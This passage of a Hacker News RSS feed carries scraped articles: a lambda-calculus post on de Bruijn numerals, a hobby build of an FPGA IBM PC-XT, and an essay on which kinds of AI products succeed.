&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945587</guid><pubDate>Sun, 16 Nov 2025 15:00:24 +0000</pubDate></item><item><title>De Bruijn Numerals</title><link>https://text.marvinborner.de/2023-08-22-22.html</link><description>&lt;doc fingerprint="ef45da1b4963ab68"&gt;
  &lt;main&gt;
    &lt;p&gt;A method that I have not seen yet is an encoding by reference depth. Specifically, I refer to a nested de Bruijn index that, by itself, encodes the number:&lt;/p&gt;
    &lt;p&gt;⟨n⟩d=λS(n)n&lt;/p&gt;
    &lt;p&gt;For example, the decimal number 4 would be encoded as ⟨4⟩d=λ54. Isn’t this just so elegant? Because I could not find a name for the encoding, I call them de Bruijn numerals.&lt;/p&gt;
    &lt;p&gt;However, during my experiments with this encoding, I made an unfortunate discovery. While reading up on the theory behind optimal reduction in some ancient book I found in the library, I stumbled upon the work “Some Unusual Numeral Systems” by Wadsworth (1980), which was coincidentally published in the same book as Lévy’s legendary paper on optimal reduction. In this work, Christopher Wadsworth analyzed different properties of numeral systems and the requirements they have to fulfill to be useful for arithmetic.&lt;/p&gt;
    &lt;p&gt;Specifically, he calls a numeral system adequate if it allows for a successor (succ) function, predecessor (pred) function, and a zero? function yielding a true (false) encoding when a number is zero (or not). He then went on to show that there can not exist an adequate numeral system encoding numbers as ⟨n⟩e=λknEn, with En being a normal form and kn increasing indefinitely with n. And, to be fair, it makes sense: An increasing n will require an increasing number of applications scaling with kn – thus requiring a zero? function to know the number already. Otherwise, the increasing abstractions can not be “collapsed” to terms encoding booleans, as they must have a constant number of abstractions. (read his paper for more details)&lt;/p&gt;
    &lt;p&gt;Unfortunately, a zero? function is required in order to convert any number from this numeral system to another system. So, even with these limitations, can the “de Bruijn numerals” still be useful for anything? What do other arithmetic operations look like?&lt;/p&gt;
    &lt;p&gt;Arithmetic&lt;/p&gt;
    &lt;p&gt;The simplest operation is the succ function, which is minimally defined as succ=λ321=bk&lt;/p&gt;
    &lt;p&gt;Proof&lt;/p&gt;
    &lt;p&gt;To prove: ∀n∈N0:succ⟨n⟩d⇝∗⟨S(n)⟩d&lt;/p&gt;
    &lt;p&gt;Proof by β-reduction (⇝): succ⟨n⟩d=⇝⇝(λ321)λS(n)nλ2(λS(n)n)1λ2λnS(n)=λS(S(n))S(n)=⟨S(n)⟩d&lt;/p&gt;
    &lt;p&gt;The pred function can be implemented similarly: pred=λ2100=w&lt;/p&gt;
    &lt;p&gt;Proof&lt;/p&gt;
    &lt;p&gt;To prove: ∀n∈N0:pred⟨S(n)⟩d⇝∗⟨n⟩d&lt;/p&gt;
    &lt;p&gt;Proof by β-reduction (⇝): pred⟨S(n)⟩d=⇝⇝⇝(λ2100)λS(S(n))S(n)λ(λS(S(n))S(n))00λ(λS(n)S(n))0λλnn=λS(n)n=⟨n⟩d&lt;/p&gt;
    &lt;p&gt;They both use the fact that the outermost abstraction is always bound to the inner de Bruijn index. Substituting the index with a reference to a fresh abstraction results in incrementing/decrementing behavior (utilizing the shift procedure of β-reduction with de Bruijn indices)&lt;/p&gt;
    &lt;p&gt;One problem of pred is its application to ⟨0⟩d. Optimally, pred should probably return λ10 again, but in this case the ω combinator λ100 is returned. I’m not sure if there exists a totalpred function for this encoding.&lt;/p&gt;
    &lt;p&gt;Now, normally further operations could be defined by recursion ending with a truthy zero?. Of course, this is not an option for this encoding.&lt;/p&gt;
    &lt;p&gt;So instead, here’s an incredibly tiny self-contained addition function: add=λ32(10)=b&lt;/p&gt;
    &lt;p&gt;Proof&lt;/p&gt;
    &lt;p&gt;To prove: ∀a,b∈N0:add⟨a⟩d⟨b⟩d⇝∗⟨a+b⟩d&lt;/p&gt;
    &lt;p&gt;Proof by β-reduction (⇝): add⟨a⟩d⟨b⟩d=⇝⇝⇝⇝(λ32(10))(λS(a)a)λS(b)b(λ2(λS(a)a)(10))λS(b)bλ1(λS(a)a)(λS(b)b0)λ1(λS(a)a)(λbb)λ1λaλb[a+b]=λS(a+b)[a+b]=⟨a+b⟩d&lt;/p&gt;
    &lt;p&gt;Isn’t it magical? This is one of the reasons I still like the encoding: it abuses the de Bruijn shifting so elegantly! It’s basically like a metacircular numeral system since it hijacks the host reducer’s computations!&lt;/p&gt;
    &lt;p&gt;On the other hand, I was not yet able to come up with further such elegant functions (maybe you can help?) – instead, I came up with some hybrid implementations which use multiple different numeral systems (in this case, Church’s).&lt;/p&gt;
    &lt;p&gt;Hybrid&lt;/p&gt;
    &lt;p&gt;A Church numeral is not that different from a de Bruijn numeral, as it turns out. It is defined like this:&lt;/p&gt;
    &lt;p&gt;⟨n⟩c=λ10∘⋯∘0n&lt;/p&gt;
    &lt;p&gt;Converting (“apostatizing”) a Church numeral to a de Bruijn numeral is done using the conv function:&lt;/p&gt;
    &lt;p&gt;conv=λ0k=tk&lt;/p&gt;
    &lt;p&gt;With the internal structure of the Church encoding, this basically comes down to applying succn−1 times on k=⟨1⟩d, as succ=bk.&lt;/p&gt;
    &lt;p&gt;Proof&lt;/p&gt;
    &lt;p&gt;To prove: ∀n∈N0:conv⟨n⟩c⇝∗⟨n⟩d&lt;/p&gt;
    &lt;p&gt;Proof by beta reduction (⇝): conv⟨n⟩c=⇝⇝⇝succ(λ0k)λ0∘⋯∘0n(λ0∘⋯∘0n)kk∘⋯∘kn=bk(bk(…(bk⟨1⟩d)…)λS(n)n=⟨n⟩d&lt;/p&gt;
    &lt;p&gt;In general, assuming an encoding e of ⟨n⟩e has a zero?* and pred* function, a universal conversion function conv* can be defined:&lt;/p&gt;
    &lt;p&gt;conv*=fix(λ3zero?*01(2(succ1)(pred*0)))⟨0⟩d&lt;/p&gt;
    &lt;p&gt;The function consists of fairly typical fix-recursion using a left case (zero?01) to return the constructed term if the input number is zero and a right case (2(succ1)(pred*0)) that calls the fix-induced function recursively with the incremented de Bruijn numeral and decremented input number.&lt;/p&gt;
    &lt;p&gt;∗∗∗&lt;/p&gt;
    &lt;p&gt;Anyway, with the insight on Church numerals, we find that the de Bruijn numerals are defined from nothing else than ⟨a⟩d=k∘⋯∘ka. If we now, say, want to multiply a number with a different number b, this composition sequence has to be composed b-times. mult⟨a⟩d⟨a⟩d⇝∗k∘⋯∘ka∘⋯∘k∘⋯∘kab And – you might have guessed it – the n-times composing Church encoding does exactly that: ⟨a⟩c⟨b⟩d⇝∗⟨a⋅b⟩d&lt;/p&gt;
    &lt;p&gt;Indeed, any operation on Church numerals can now be made to return a de Bruijn numeral, simply by applying ⟨1⟩d. Others can be transformed internally such that they also use de Bruijn operations: fac=λ10(λ20(1(λ221(10))))(λ1⟨1⟩d)ifac⟨5⟩c⇝∗⟨120⟩d Of course – still – the resulting de Bruijn numerals can never be converted back to an encoding like Church’s.&lt;/p&gt;
    &lt;p&gt;Next, an actual problem where I use de Bruijn numerals in practice all the time!&lt;/p&gt;
    &lt;p&gt;Projections&lt;/p&gt;
    &lt;p&gt;I always found Church n-tuples really hard to work with. This is because selecting the ith element – again – requires an increasing number of abstractions! In fact their behavior is so similar that I could only now make use of them after gaining insight about de Bruijn numerals. They are defined like this: tuplen=λS(n)0n[n−1]…1[x1,x2,…,xn]c=tuplenx1…xn⇝∗λ10x1x2…xn Retrieving the ith element of an n-tuple would then look something like this: selectni[x1,x2,…,xn]c⇝∗xi, which of course must reject all terms but xi, therefore requiring an application of λS(n)i to the tuple. Specifically, with Church numerals as parameters, selector⟨n⟩c⟨i⟩c⇝∗λS(n)i.&lt;/p&gt;
    &lt;p&gt;Luckily, such a term can be constructed using de Bruijn numerals. The idea is simple: First, we apply ⟨i⟩d to ⟨n⟩d, such that we get λnλS(i)i. Then, we remove i abstractions such that it yields λS(n)i. Using i to pop the abstractions, we get: selector=λ20(ti)(1k(0k)) (note that ⟨n⟩c(ta)⇝∗λ10aa…an)&lt;/p&gt;
    &lt;p&gt;Finally, with this knowledge, Church n-tuples can be used almost like Church lists. Some further functions: pushpop0pop1popnmove=λ31(02)=q’’=λ21(λ11)=λ21(λ221)=λ31(2bk0)=λ31(λ13b(λ101)1)&lt;/p&gt;
    &lt;p&gt;where move moves the first element to the nth position, without knowing the size of the tuple! move⟨i⟩c[x1,…,xn]⇝∗[x2,…,x1,…xn]&lt;/p&gt;
    &lt;p&gt;Notably, something like move or pop-n generally requires recursion for Church lists. At the same time for Church n-tuples, something as simple as counting the elements is not possible for the same reasons as a zero? function for de Bruijn numerals, as the counting function would have to ignore (and count) n applied arguments.&lt;/p&gt;
    &lt;p&gt;(see also a Forth/postscript-like stack language DSL in bruijn using this stack encoding here)&lt;/p&gt;
    &lt;p&gt;Thanks for reading. Please let me know if you know of – or come up with! – other/better operations for de Bruijn numerals. Contact me via email. Support on Ko-fi. Subscribe on RSS. Follow on Mastodon.&lt;/p&gt;
    &lt;p&gt;Wadsworth, Christopher. 1980. “Some Unusual λ-Calculus Numeral Systems.” To HB Curry: Essays on Combinatory Logic, Lambda Calculus; Formalism.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945750</guid><pubDate>Sun, 16 Nov 2025 15:22:16 +0000</pubDate></item><item><title>FPGA Based IBM-PC-XT</title><link>https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/</link><description>&lt;doc fingerprint="a75e788d5dab06ad"&gt;
  &lt;main&gt;
    &lt;p&gt;Recently I undertook a hobby project to recreate an IBM XT Personal Computer from the 1980s using a mix of authentic parts and modern technology. I had a clear goal in mind: I wanted to be able to play the EGA version of Monkey Island 1 on it, with no features missing. This means I need mouse support, hard drive with write access for saving the game, and Adlib audio, my preferred version of the game’s musical score.&lt;/p&gt;
    &lt;p&gt;The catalyst for this project was the discovery that there are low-power versions of the NEC V20 CPU available (UPD70108H), which is compatible with the Intel 8088 used in the XT. Being a low-power version significantly simplifies its connection to an FPGA, which typically operate with 3.3-volt IO voltages. Coupled with a low-power 1MB SRAM chip (CY62158EV30) to provide the XT with its 640KB of memory, and I started to have the bones of a complete system worked out.&lt;/p&gt;
    &lt;p&gt;I started off by designing the hardware of the system, which would then serve as my development board while I worked on the software/gateware. The following features were added:&lt;lb/&gt;– DIP-40 socket for an low power NEC V20 CPU&lt;lb/&gt;– 1MB SRAM chip for the system memory&lt;lb/&gt;– An icesugar-pro FPGA board with a Lattice LFE5U-25F&lt;lb/&gt;– Dual PS/2 connectors for keyboard and mouse&lt;lb/&gt;– Micro SD card socket to act as a Fixed Disk&lt;lb/&gt;– An authentic YM3014B digital-to-analogue converter for audio&lt;lb/&gt;– A Piezo speaker that can be driven by the programmable-interval-timer for system bleeps&lt;lb/&gt;– Lastly, a reset switch and some status LEDs&lt;/p&gt;
    &lt;p&gt;I drew up my design using the EasyEDA CAD software as I’m already familiar with it, and it has really good integration with the JLCPCB PCB assembly service. Some of the components in the design are too tricky for me to hand solder by myself. I did however have to solder the SRAM chips once the boards arrived since they were not stocked by LCSC so I had to source them elsewhere.&lt;/p&gt;
    &lt;p&gt;The first step was to write a bus controller for the processor. The V20 CPU clock is more forgiving than an original i8088 since its can be run right down to 0hz and its uses a regular 50% duty cycle. The external interface for an 8088 CPU operates in terms of bus cycles. At that start of a bus cycle the CPU asserts some pins to let everyone know what it wants to try and do… read memory, write to IO, etc. Each type of bus cycle follows a specific sequence of events that happen over a number of clock cycles. It was straight forward to make a state machine that could detect the start of a bus-cycle, figure out what kind it was, and then produce or consume the data as needed by the CPU. Key here, was to make sure that all of the timing requirements were met, so that signals the CPU generates are sampled at the correct time, and signals the CPU requires have been driven correctly before the CPU reads them.&lt;/p&gt;
    &lt;p&gt;My first test for the bus controller was to write a simple program using NASM to be executed on the V20, with a simple goal… it will flash an LED mapped to an IO port address. Simple, but a blinking LED seems to be the hardware equivalent of the software hello-world. For the initial version, the program was simply loaded into a FPGA block ram and used directly as the system memory.&lt;/p&gt;
    &lt;p&gt;Later, I used a more complex approach for memory accesses. The bios, for example, is loaded into an FPGA block ram, so that CPU memory reads will come from that rather than the system SRAM chip. Video memory is implemented a differently still. CPU memory writes are passed to both the video memory block ram and system SRAM, but CPU reads alway come from only the system SRAM. This then means that I have a spare read port on the video block ram that can then be used by the VGA signal generator to display the video memory contents.&lt;/p&gt;
    &lt;p&gt;After my success with a blinky program, I installed a virtual copy of Supersoft/Landmark Diagnostic ROM in place of the BIOS and wrote a basic CGA adapter for video output. I was then able to use the diagnostic ROM to test the SRAM memory interface as well as some of the peripherals required by the XT such as the programmable-interval-timer (i8253) and programmable-interrupt-controller (i8259).&lt;/p&gt;
    &lt;p&gt;Once I was confident the basic system was stable I then swaped in a generic XT bios from https://www.phatcode.net in place of the diagnostic ROM. It was amazing to see the bios start to boot up, and complain when it couldnt find a boot disk.&lt;/p&gt;
    &lt;p&gt;Fixed Disk access is achieved by making a small Verilog SPI controller accessible to the CPU via some unused IO ports. I then wrote an option ROM to handle BIOS INT13H (disk service) calls, which had routines that could issue commands to the SD-Card over SPI. The tricky part for me was learning the SD card protocol and then writing 8088 assembly to perform the correct operations. The mapping itself is very straightforward as both SD card and DOS assume 512byte sectors.&lt;/p&gt;
    &lt;p&gt;I saved a lot of time when writing the option ROM by developing and debugging the code using a software emulator of the board that I cobbled together. Some historic sources for it can be found here: https://github.com/bit-hack/iceXt/tree/master/misc/emulator&lt;/p&gt;
    &lt;p&gt;Perhaps the hardest part of the project was, surprisingly, getting the mouse to work. Mice of the XT era would typically be connected to a UART serial port. I had however placed a PS/2 connector on the hardware board, and those mice use a very different protocol. In my efforts to support a mouse I startedto learn about PS/2 devices, however I would need to implement a much more complex keyboard controller, and the BIOS I was also lacked support for such modern peripherals, and I just plain didn’t feel like I understood everything required to get that working.&lt;/p&gt;
    &lt;p&gt;What makes it tricky is that PS/2 is a bidirectional protocol, and the mouse has to be asked by the PC to broadcast updates, otherwise we will not receive any. That added a lot more complexity than I was wanting. The keyboard on the otherhand is relatively easy to work with and send out keypresses without having to be asked.&lt;/p&gt;
    &lt;p&gt;I chose an alternative. I wrote some Verilog code to talk directly to the PS/2 mouse, which would early in the boot process tell it to start sending over mouse events, as they have to be requested. When the bridge then receives mouse events, it translates and presents them to the computer via a pseudo UART peripheral. I had implemented a basic PS/2 mouse to Serial mouse bridge. A little convoluted but it works really well.&lt;/p&gt;
    &lt;p&gt;During this process, I lobotomised a spare mouse by attaching a logic analyser the clk and dat pads inside the mouse. I was then able to capture the communications between a real PC and the mouse and observe it during use. This gave me invaluable insight into exactly how the protocol worked, and what a real mouse expected.&lt;/p&gt;
    &lt;p&gt;I also found that having real waveforms to look at made it much easier to test components of my design in verilator, a Verilog simulator, as I could closely model the stimulus it should see when running in the FPGA.&lt;/p&gt;
    &lt;p&gt;Just like the XT, one of the channels of the PIT timer is used to drive the internal speaker to produce bleep and bloop sounds. I extended this by having disk accesses trigger short pulses out of the peizo speaker as a crude emulation of a hard disk seeking. I think it really adds to the experience when you can hear your computer thinking away while doing its tasks. When it comes to music, the internal PC speaker quickly looses its charm however. Writing an YM3812 implementation (the FM chip used in the Adlib card) is beyond my skill level but thankfully Jose Tejada has written an amazing open source version that I was able to pull into my project; https://github.com/jotego/jtopl.&lt;/p&gt;
    &lt;p&gt;I wrote a small Verilog module to take the PCM sample data generated by this soft YM3812 and convert it to the unusual 3:10 floating point format required by the YM3014 DAC on my board. This is very similar to the operation of the real Adlib hardware, where the YM3812 generates and sends serial audio data to a YM3014 DAC chip. A modern I2S DAC may have been cleaner, but having a chance to play with the authentic DAC seemed a little more fun to me. All of this combined results in the same lovely crisp FM tones I was so fond of when I played games on my PC growing up.&lt;/p&gt;
    &lt;p&gt;A lot of other elements of this project have been glossed over or omitted, such as support for CGA and EGA graphics. There is even a USB to UART bridge for sending files from a host PC directly to the SD card. I also made some nice clear acrylic panels on a CNC machine to round off the design and protect the bare PCB.&lt;/p&gt;
    &lt;p&gt;A video demo is shown below.&lt;lb/&gt;Unfortunately there is a ton of screen tearing due to the phase between the monitor and my camera. It isn’t visible in person.&lt;/p&gt;
    &lt;p&gt;Source code, schematics and gerber files are available on github here: https://github.com/bit-hack/iceXt&lt;/p&gt;
    &lt;p&gt;Thanks for reading!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945784</guid><pubDate>Sun, 16 Nov 2025 15:26:24 +0000</pubDate></item><item><title>Dissecting Flock Safety: The Cameras Tracking You Are a Security Nightmare [video]</title><link>https://www.youtube.com/watch?v=uB0gr7Fh6lY</link><description>&lt;doc fingerprint="7055905545553646"&gt;
  &lt;main&gt;
    &lt;p&gt;About Press Copyright Contact us Creators Advertise Developers Terms Privacy Policy &amp;amp; Safety How YouTube works Test new features NFL Sunday Ticket © 2025 Google LLC&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45945960</guid><pubDate>Sun, 16 Nov 2025 15:50:54 +0000</pubDate></item><item><title>Three kinds of AI products work</title><link>https://www.seangoedecke.com/ai-products/</link><description>&lt;doc fingerprint="b63184d5a306aaff"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Only three kinds of AI products actually work&lt;/head&gt;
    &lt;p&gt;The very first LLM-based product, ChatGPT, was just1 the ability to talk with the model itself: in other words, a pure chatbot. This is still the most popular LLM product by a large margin.&lt;/p&gt;
    &lt;p&gt;In fact, given the amount of money that’s been invested in the industry, it’s shocking how many “new AI products” are just chatbots. As far as I can tell, there are only three types of AI product that currently work.&lt;/p&gt;
    &lt;head rend="h3"&gt;Chatbots&lt;/head&gt;
    &lt;p&gt;For the first couple of years of the AI boom, all LLM products were chatbots. They were branded in a lot of different ways - maybe the LLM knew about your emails, or a company’s helpdesk articles - but the fundamental product was just the ability to talk in natural language to an LLM.&lt;/p&gt;
    &lt;p&gt;The problem with chatbots is that the best chatbot product is the model itself. Most of the reason users want to talk with an LLM is generic: they want to ask questions, or get advice, or confess their sins, or do any one of a hundred things that have nothing to do with your particular product.&lt;/p&gt;
    &lt;p&gt;In other words, your users will just use ChatGPT2. AI labs have two decisive advantages over you: first, they will always have access to the most cutting-edge models before you do; and second, they can develop their chatbot harness simultaneously with the model itself (like how Anthropic specifically trains their models to be used in Claude Code, or OpenAI trains their models to be used in Codex).&lt;/p&gt;
    &lt;head rend="h4"&gt;Explicit roleplay&lt;/head&gt;
    &lt;p&gt;One way your chatbot product can beat ChatGPT is by doing what OpenAI won’t do: for instance, happily roleplaying an AI boyfriend or generating pornography. There is currently a very lucrative niche of products like this, which typically rely on less-capable but less-restrictive open-source models.&lt;/p&gt;
    &lt;p&gt;These products have the problems I discussed above. But it doesn’t matter that their chatbots are less capable than ChatGPT or Claude: if you’re in the market for sexually explicit AI roleplay, and ChatGPT and Claude won’t do it, you’re going to take what you can get.&lt;/p&gt;
    &lt;p&gt;I think there are serious ethical problems with this kind of product. But even practically speaking, this is a segment of the industry likely to be eaten alive by the big AI labs, as they become more comfortable pushing the boundaries of adult content. Grok Companions is already going down this pathway, and Sam Altman has said that OpenAI models will be more open to generating adult content in the future.&lt;/p&gt;
    &lt;head rend="h4"&gt;Chatbots with tools&lt;/head&gt;
    &lt;p&gt;There’s a slight variant on chatbots which gives the model tools: so instead of just chatting with your calendar, you can ask the chatbot to book meetings, and so on. This kind of product is usually called an “AI assistant”.&lt;/p&gt;
    &lt;p&gt;This doesn’t work well because savvy users can manipulate the chatbot into calling tools. So you can never give a support chatbot real support powers like “refund this customer”, because the moment you do, thousands of people will immediately find the right way to jailbreak your chatbot into giving them money. You can only give your chatbots tools that the user could do themselves - in which case, your chatbot is competing with the usability of your actual product, and will likely lose.&lt;/p&gt;
    &lt;p&gt;Why will your chatbot lose? Because chat is not a good user interface. Users simply do not want to type out “hey, can you increase the font size for me” when they could simply hit “ctrl-plus” or click a single button3.&lt;/p&gt;
    &lt;p&gt;I think this is a hard lesson for engineers to learn. It’s tempting to believe that since chatbots have gotten 100x better, they must now be the best user interface for many tasks. Unfortunately, they started out 200x worse than a regular user interface, so they’re still twice as bad.&lt;/p&gt;
    &lt;head rend="h3"&gt;Completion&lt;/head&gt;
    &lt;p&gt;The second real AI product actually came out before ChatGPT did: GitHub Copilot. The idea behind the original Copilot product (and all its imitators, like Cursor Tab) is that a fast LLM can act as a smart autocomplete. By feeding the model the code you’re typing as you type it, a code editor can suggest autocompletions that actually write the rest of the function (or file) for you.&lt;/p&gt;
    &lt;p&gt;The genius of this kind of product is that users never have to talk to the model. Like I said above, chat is a bad user interface. LLM-generated completions allow users to access the power of AI models without having to change any part of their current workflow: they simply see the kind of autocomplete suggestions their editor was already giving them, but far more powerful.&lt;/p&gt;
    &lt;p&gt;I’m a little surprised that completions-based products haven’t taken off outside coding (where they immediately generated a multi-billion-dollar market). Google Docs and Microsoft Word both have something like this. Why isn’t there more hype around this?&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maybe the answer is that the people using this product don’t engage with AI online spaces, and are just quietly using the product?&lt;/item&gt;
      &lt;item&gt;Maybe there’s something about normal professional writing that’s less amenable to autocomplete than code? I doubt that, since so much normal professional writing is being copied out of a ChatGPT window.&lt;/item&gt;
      &lt;item&gt;It could be that code editors already had autocomplete, so users were familiar with it. I bet autocomplete is brand-new and confusing to many Word users.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Agents&lt;/head&gt;
    &lt;p&gt;The third real AI product is the coding agent. People have been talking about this for years, but it was only really in 2025 that the technology behind coding agents became feasible (with Claude Sonnet 3.7, and later GPT-5-Codex).&lt;/p&gt;
    &lt;p&gt;Agents are kind of like chatbots, in that users interact with them by typing natural language text. But they’re unlike chatbots in that you only have to do that once: the model takes your initial request and goes away to implement and test it all by itself.&lt;/p&gt;
    &lt;p&gt;The reason agents work and chatbots-with-tools don’t is the difference between asking an LLM to hit a single button for you and asking the LLM to hit a hundred buttons in a specific order. Even though each individual action would be easier for a human to perform, agentic LLMs are now smart enough to take over the entire process.&lt;/p&gt;
    &lt;p&gt;Coding agents are a natural fit for AI agents for two reasons:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;It’s easy to verify changes by running tests or checking if the code compiles&lt;/item&gt;
      &lt;item&gt;AI labs are incentivized to produce effective coding models to accelerate their own work&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For my money, the current multi-billion-dollar question is can AI agents be useful for tasks other than coding? Bear in mind that Claude Sonnet 3.5 was released just under nine months ago. In that time, the tech industry has successfully built agentic products about their own work. They’re just starting to build agentic products for other tasks. It remains to be seen how successful that will be, or what those products will look like.&lt;/p&gt;
    &lt;head rend="h4"&gt;Research&lt;/head&gt;
    &lt;p&gt;There’s another kind of agent that isn’t about coding: the research agent. LLMs are particularly good at tasks like “skim through ten pages of search results” or “keyword search this giant dataset for any information on a particular topic”. I use this functionality a lot for all kinds of things.&lt;/p&gt;
    &lt;p&gt;There are a few examples of AI products built on this capability, like Perplexity. In the big AI labs, this has been absorbed into the chatbot products: OpenAI’s “deep research” went from a separate feature to just what GPT-5-Thinking does automatically, for instance.&lt;/p&gt;
    &lt;p&gt;I think there’s almost certainly potential here for area-specific research agents (e.g. in medicine or law).&lt;/p&gt;
    &lt;head rend="h3"&gt;Feeds&lt;/head&gt;
    &lt;p&gt;If agents are the most recent successful AI product, AI-generated feeds might be the one just over the horizon. AI labs are currently experimenting with ways of producing infinite feeds of personalized content to their users:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Mark Zuckerberg has talked about filling Instagram with auto-generated content&lt;/item&gt;
      &lt;item&gt;OpenAI has recently launched a Sora-based video-gen feed&lt;/item&gt;
      &lt;item&gt;OpenAI has also started pushing users towards “Pulse”, a personalized daily update inside the ChatGPT product&lt;/item&gt;
      &lt;item&gt;xAI is working on putting an infinite image and video feed into Twitter&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So far none of these have taken off. But scrolling feeds has become the primary way users interact with technology in general, so the potential here is massive. It does not seem unlikely to me at all that in five years time most internet users will spend a big part of their day scrolling an AI-generated feed.&lt;/p&gt;
    &lt;p&gt;Like a completions-based product, the advantage of a feed is that users don’t have to interact with a chatbot. The inputs to the model come from how the user interacts with the feed (likes, scrolling speed, time spent looking at an item, and so on). Users can experience the benefits of an LLM-generated feed (if any) without having to change their consumption habits at all.&lt;/p&gt;
    &lt;p&gt;The technology behind current human-generated infinite feeds is already a mature application of state of the art machine learning. When you interact with Twitter or LinkedIn, you’re interacting with a model, except instead of generating text it’s generating lists of other people’s posts. In other words, feeds already maintain a sophisticated embedding of your personal likes and dislikes. The step from “use that embedding to surface relevant content” to “use that embedding to generate relevant content” might be very short indeed.&lt;/p&gt;
    &lt;p&gt;I’m pretty suspicious of AI-generated infinite feeds of generated video, but I do think other kinds of infinite feeds are an under-explored kind of product. In fact, I built a feed-based hobby project of my own, called Autodeck4. The idea was to use an AI-generated feed to generate spaced repetition cards for learning. It works pretty well! It still gets a reasonable amount of use from people who’ve found it via my blog (also, from myself and my partner).&lt;/p&gt;
    &lt;head rend="h3"&gt;Games&lt;/head&gt;
    &lt;p&gt;One other kind of AI-generated product that people have been talking about for years is the AI-based video game. The most speculative efforts in this direction have been full world simulations like DeepMind’s Genie, but people have also explored using AI to generate a subset of game content, such as pure-text games like AI Dungeon or this Skyrim mod which adds AI-generated dialogue. Many more game developers have incorporated AI art or audio assets into their games.&lt;/p&gt;
    &lt;p&gt;Could there be a transformative product that incorporates LLMs into video games? I don’t think ARC Raiders counts as an “AI product” just because it uses AI voice lines, and the more ambitious projects haven’t yet really taken off. Why not?&lt;/p&gt;
    &lt;p&gt;One reason could be that games just take a really long time to develop. When Stardew Valley took the world by storm in 2016, I expected a flood of copycat cozy pixel-art farming games, but that only really started happening in 2018 and 2019. That’s how long it takes to make a game! So even if someone has a really good idea for an LLM-based video game, we’re probably still a year or two out from it being released.&lt;/p&gt;
    &lt;p&gt;Another reason is that many gamers really don’t like AI. Including generative AI in your game is a guaranteed controversy (though it doesn’t seem to be fatal, as the success of ARC Raiders shows). I wouldn’t be surprised if some game developers simply don’t think it’s worth the risk to try an AI-based game idea5.&lt;/p&gt;
    &lt;p&gt;A third reason could be that generated content is just not a good fit for gaming. Certainly ChatGPT-like dialogue sticks out like a sore thumb in most video games. AI chatbots are also pretty bad at challenging the user: their post-training is all working to make them try to satisfy the user immediately6. Still, I don’t think this is an insurmountable technical problem. You could simply post-train a language model in a different direction (though perhaps the necessary resources for that haven’t yet been made available to gaming companies).&lt;/p&gt;
    &lt;head rend="h3"&gt;Summary&lt;/head&gt;
    &lt;p&gt;By my count, there are three successful types of language model product:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Chatbots like ChatGPT, which are used by hundreds of millions of people for a huge variety of tasks&lt;/item&gt;
      &lt;item&gt;Completions coding products like Copilot or Cursor Tab, which are very niche but easy to get immediate value from&lt;/item&gt;
      &lt;item&gt;Agentic products like Claude Code, Codex, Cursor, and Copilot Agent mode, which have only really started working in the last six months&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;On top of that, there are two kinds of LLM-based product that don’t work yet but may soon:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;LLM-generated feeds&lt;/item&gt;
      &lt;item&gt;Video games that are based on AI-generated content&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Almost all AI products are just chatbots (e.g. AI-powered customer support). These suffer from having to compete with ChatGPT, which is a superior general product, and not being able to use powerful tools, because users will be able to easily jailbreak the model.&lt;/p&gt;
    &lt;p&gt;Agentic products are new, and have been wildly successful for coding. It remains to be seen what they’ll look like in other domains, but we’ll almost certainly see domain-specific research agents in fields like law. Research agents in coding have seen some success as well (e.g. code review or automated security scanning products).&lt;/p&gt;
    &lt;p&gt;Infinite AI-generated feeds haven’t yet been successful, but hundreds of millions of dollars are currently being poured into them. Will OpenAI’s Sora be a real competitor to Twitter or Instagram, or will those companies release their own AI-generated feed product?&lt;/p&gt;
    &lt;p&gt;AI-generated games sound like they could be a good idea, but there’s still no clear working strategy for how to incorporate LLMs into a video game. Pure world models - where the entire game is generated frame-by-frame - are cool demos but a long way from being products.&lt;/p&gt;
    &lt;p&gt;One other thing I haven’t mentioned is image generation. Is this part of a chatbot product, or a tool in itself? Frankly, I think AI image generation is still more of a toy than a product, but it’s certainly seeing a ton of use. There’s probably some fertile ground for products here, if they can successfully differentiate themselves from the built-in image generation in ChatGPT.&lt;/p&gt;
    &lt;p&gt;In general, it feels like the early days of the internet. LLMs have so much potential, but we’re still mostly building copies of the same thing. There have to be some really simple product ideas that we’ll look back on and think “that’s so obvious, I wonder why they didn’t do it immediately”.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;Of course, “just” here covers a raft of progress in training stronger models, and real innovations around RLHF, which made it possible to talk with pure LLMs at all.&lt;/p&gt;↩&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;This is a big reason why most AI enterprise projects fail. Anecdotally, I have heard a lot of frustration with bespoke enterprise chatbots. People just want to use ChatGPT!&lt;/p&gt;↩&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;If you’re not convinced, take any device you’re comfortable using (say, your phone, your car, your microwave) and imagine having to type out every command. Maybe really good speech recognition will fix this, but I doubt it.&lt;/p&gt;↩&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;I wrote about it here and it’s linked in the topbar.&lt;/p&gt;↩&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Though this could be counterbalanced by what I’m sure is a strong push from executives to get in on the action and “build something with AI”.&lt;/p&gt;↩&lt;/item&gt;
